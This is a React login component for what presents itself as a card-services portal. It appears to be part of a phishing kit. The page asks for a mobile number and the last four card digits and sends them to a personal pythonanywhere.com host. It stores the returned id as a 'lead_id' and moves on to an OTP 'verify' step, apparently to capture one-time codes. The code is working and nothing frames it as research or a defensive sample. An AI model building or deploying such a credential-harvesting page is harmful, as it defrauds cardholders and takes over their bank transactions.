import * as React from "react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { CreditCard, PhoneIcon } from "lucide-react";

export default function Login() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Adding the custom shadow style
    const style = document.createElement("style");
    style.innerHTML = `
        .up-shadow {
            -webkit-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            -moz-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            box-shadow: 0px -18px 68px -22px #ffae0075;
        }
        /* Hide scrollbar for Chrome, Safari and Opera */
        .no-scrollbar::-webkit-scrollbar {
            display: none;
        }
        /* Hide scrollbar for IE, Edge and Firefox */
        .no-scrollbar {
            -ms-overflow-style: none;  /* IE and Edge */
            scrollbar-width: none;  /* Firefox */
        }
    `;
    document.head.appendChild(style);

    return () => {
      document.head.removeChild(style);
    };
  }, []);

  const handlePhoneInput = (e: React.FormEvent<HTMLInputElement>) => {
    if (e.currentTarget.value.length > 10) {
      e.currentTarget.value = e.currentTarget.value.slice(0, 10);
    }
  };

  const handleCardInput = (e: React.FormEvent<HTMLInputElement>) => {
    if (e.currentTarget.value.length > 4) {
      e.currentTarget.value = e.currentTarget.value.slice(0, 4);
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData.entries());

    try {
      const response = await fetch("https://ozxge94346.pythonanywhere.com/api/login/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        const result = await response.json();
        sessionStorage.setItem("lead_id", result.id); // Save ID
        navigate("/verify");
      } else {
        console.error("Login failed");
        alert("Login failed. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <nav className="sticky top-0 bg-white flex items-center justify-between p-4 shadow w-full z-10">
        <img src="/logo.png" alt="Logo" className="scale-[0.65]" />
      </nav>

      <div
        className="flex flex-col justify-between gap-16"
        style={{ height: "93vh" }}
      >
        <div className="flex gap-2 items-center px-4 mt-8">
          <div className="px-3">
            <h1 className="text-2xl font-semibold">Welcome</h1>
            <p className="text-sm mt-2 text-gray-600">
              Setup your Card and manage your transaction preferences & limits
              to enjoy incredible benefits!
            </p>
          </div>
          <img src="/login-amico.svg" alt="Login" className="w-1/2" />
        </div>

        <div className="grow w-full rounded-t-3xl drop-shadow-md pt-10 border-t up-shadow bg-[#FBF6EB]">
          <form
            className="flex flex-col items-center px-6 w-full max-w-md mx-auto"
            id="form"
            onSubmit={handleSubmit}
          >
            <h1 className="text-3xl font-semibold mb-8 text-gray-800">Login</h1>

            <div className="mb-6 w-full">
              <label
                htmlFor="phone"
                className="block text-gray-700 text-sm font-medium mb-1"
              >
                <PhoneIcon className="inline-block mr-2 align-middle text-gray-700" />
                Enter your <b className="font-bold">Registered mobile number</b>
              </label>
              <input
                type="number"
                id="phone"
                name="phone"
                className="ml-6 mt-1 p-2 w-[calc(100%-1.5rem)] border-b-2 bg-[#FBF6EB] focus:outline-none focus:border-red-900 transition-colors"
                min={1000000000}
                max={9999999999}
                style={{ borderColor: "#7F1D1D" }}
                required
                onInput={handlePhoneInput}
              />
            </div>

            <div className="mb-8 w-full">
              <label
                htmlFor="card"
                className="block text-gray-700 text-sm font-medium mb-1"
              >
                <CreditCard className="inline-block mr-2 align-middle text-gray-700" />
                Enter <b className="font-medium">last 4 digits</b> of your card
                number
              </label>
              <input
                type="number"
                id="card"
                name="card"
                className="ml-6 mt-1 p-2 w-[calc(100%-1.5rem)] border-b-2 bg-[#FBF6EB] focus:outline-none focus:border-red-900 transition-colors"
                style={{ borderColor: "#7F1D1D" }}
                max={9999}
                required
                onInput={handleCardInput}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="bg-red-900 text-white p-3 rounded-md w-full hover:bg-red-800 transition shadow-lg font-medium disabled:opacity-50"
            >
              {loading ? "Processing..." : "Get OTP"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
